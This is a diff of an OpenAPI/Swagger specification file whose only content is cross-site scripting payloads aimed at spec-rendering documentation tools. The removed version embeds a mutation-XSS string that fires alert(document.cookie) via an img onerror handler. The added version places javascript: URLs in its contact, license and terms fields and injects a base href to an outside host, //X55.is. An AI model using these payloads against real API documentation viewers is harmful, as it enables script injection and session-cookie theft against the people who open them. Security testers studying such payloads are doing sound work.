@@ -1,38 +1,14 @@
-swagger: '2.0'
+openapi: 3.3.1
 info:
-  title: XSS Attack BY M0X0101
-  description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1>"></form>
-  version: production
-basePath: /JSSResource/
-produces:
-  - application/xml
-  - application/json
-consumes:
-  - application/xml
-  - application/json
-security:
-  - basicAuth: []
-paths:
-  /M0X0101:
-    get:
-      responses:
-        '200':
-          description: No response was specified
-      tags:
-        - M0X0101_XSS_D
-      operationId: findAccounts
-      summary: Finds all accounts
-  '/hack/hachid/{id}':
-    delete:
-      parameters:
-        - description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1>"></form>
-          format: int64
-          in: path
-          name: id
-          required: true
-          type: integer
-      responses:
-        '200':
-          description: No response was specified
+  title: "xss test"
+  description: "Gxss'></title><Base+Href=//X55.is>"
+  termsOfService: "javascript:alert(document.domain)"
+  contact:
+    name: "xss test"
+    email: "xss test"
+    url: "javascript:alert(document.domain)"
+  license:
+    name: "xss test"
+    url: "javascript:alert(document.domain);"
+  version: "1.0"
+paths: {}
